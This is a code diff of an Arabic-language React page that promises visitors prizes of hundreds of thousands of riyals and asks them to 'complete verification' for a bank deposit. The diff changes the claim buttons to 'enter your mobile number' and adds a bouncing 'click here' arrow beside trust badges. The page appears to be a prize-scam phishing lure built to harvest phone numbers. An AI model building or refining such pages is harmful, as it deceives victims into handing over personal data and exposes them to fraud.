@@ -1,6 +1,6 @@
 import { useState, useEffect, useRef } from 'react';
 import { motion, AnimatePresence } from 'motion/react';
-import { Gift, CheckCircle, ArrowLeft, ShieldCheck, MessageCircle, Send, BadgeCheck, Lock, Star, ChevronDown } from 'lucide-react';
+import { Gift, CheckCircle, ArrowLeft, ShieldCheck, MessageCircle, Send, BadgeCheck, Lock, Star, ChevronDown, ArrowDown } from 'lucide-react';
 
 export default function App() {
   const prizes = ["350,000", "400,000", "500,000", "750,000", "1,000,000", "1,500,000"];
@@ -188,14 +188,23 @@ export default function App() {
                 تم اعتماد هذا المبلغ لك. يرجى إكمال عملية التحقق ليتم إيداع المبلغ في حسابك البنكي.
               </p>
               
-              <a 
-                href={claimLink}
-                className="group relative flex items-center justify-center gap-3 w-full bg-transparent text-[#D4AF37] font-bold text-lg py-4 rounded-full transition-all active:scale-95 overflow-hidden border border-[#D4AF37]/30 hover:border-[#D4AF37]"
-              >
-                <div className="absolute inset-0 bg-[#D4AF37]/10 group-hover:bg-[#D4AF37]/20 transition-colors"></div>
-                <Gift className="w-5 h-5" />
-                تأكيد واستلام المبلغ
-              </a>
+              <div className="relative w-full mt-10">
+                <div className="absolute -top-12 left-1/2 -translate-x-1/2 flex flex-col items-center animate-bounce text-[#D4AF37]">
+                  <span className="text-[10px] font-bold bg-[#D4AF37]/10 px-3 py-1 rounded-full mb-1 border border-[#D4AF37]/20 whitespace-nowrap backdrop-blur-sm">
+                    اضغط هنا
+                  </span>
+                  <ArrowDown size={20} className="drop-shadow-lg" />
+                </div>
+                
+                <a 
+                  href={claimLink}
+                  className="group relative flex items-center justify-center gap-3 w-full bg-transparent text-[#D4AF37] font-bold text-lg py-4 rounded-full transition-all active:scale-95 overflow-hidden border border-[#D4AF37]/30 hover:border-[#D4AF37]"
+                >
+                  <div className="absolute inset-0 bg-[#D4AF37]/10 group-hover:bg-[#D4AF37]/20 transition-colors"></div>
+                  <Gift className="w-5 h-5" />
+                  إدخال رقم جوالك
+                </a>
+              </div>
               
               <div className="mt-6 flex items-center justify-center gap-2 text-[10px] text-white/40 font-medium uppercase tracking-widest">
                 <Lock className="w-3 h-3" />
@@ -374,7 +383,7 @@ export default function App() {
                       className="flex items-center justify-center gap-2 w-full bg-[#D4AF37] text-black font-medium py-3 rounded-xl text-sm shadow-lg active:scale-95 transition-transform"
                     >
                       <Gift className="w-4 h-4" />
-                      استلام {prize} ر.س
+                      إدخال رقم جوالك
                     </a>
                   </div>
                 </motion.div>
